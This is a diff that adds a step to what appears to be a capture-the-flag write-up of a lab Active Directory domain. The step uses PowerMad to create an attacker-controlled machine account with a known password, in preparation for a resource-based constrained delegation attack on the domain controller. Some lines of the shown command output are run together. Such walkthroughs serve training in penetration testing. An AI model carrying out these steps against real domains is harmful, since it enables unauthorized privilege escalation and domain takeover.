@@ -1161,7 +1161,43 @@ ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
 <br>
 </div>
 
-### 4.
+### 4.5 Create an Attacker-Controlled Computer Account
+
+RBCD requires a computer principal the attacker controls to act as the delegation target; with the machine-account quota confirmed, PowerMad creates that account inside the domain.
+
+**Command:**
+
+```
+. .\Powermad.ps1
+New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+Get-ADComputer -Identity FAKE-COMP01
+```
+
+**Breakdown:**
+
+- `. .\Powermad.ps1`
+    - **Description:** Dot-sources the PowerMad script, loading its functions into the session.
+    - **Purpose:** Makes `New-MachineAccount` available in the current shell.
+- `New-MachineAccount -MachineAccount FAKE-COMP01 -Password ...`
+    - **Description:** Creates a new computer account with the supplied name and password.
+    - **Purpose:** Adds an attacker-controlled machine (`FAKE-COMP01$`) whose credentials are known.
+- `ConvertTo-SecureString 'Password123' -AsPlainText -Force`
+    - **Description:** Wraps a plaintext password into the SecureString type the cmdlet expects.
+    - **Purpose:** Sets a known password so the account's Kerberos hash can be derived later.
+- `Get-ADComputer -Identity FAKE-COMP01`
+    - **Description:** Reads back the new computer object.
+    - **Purpose:** Confirms creation and reveals the account's SID.
+
+**Result:**
+
+```
+[+] Machine account FAKE-COMP01 added
+DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htbName              : FAKE-COMP01SamAccountName    : FAKE-COMP01$SID               : S-1-5-21-1677581083-3380853377-188903654-6101Enabled           : True
+```
+
+_What this gives you:_ **Key finding:** an attacker-controlled computer account `FAKE-COMP01$` now exists in the domain with a known password — the principal that the DC will be configured to trust for delegation.
+
+_Next:_ Using the `GenericAll` right over the DC, set its `PrincipalsAllowedToDelegateToAccount` to `FAKE-COMP01$`, authorizing that account to act on the DC's behalf.
 <div align="center">
 <br>
 <br>
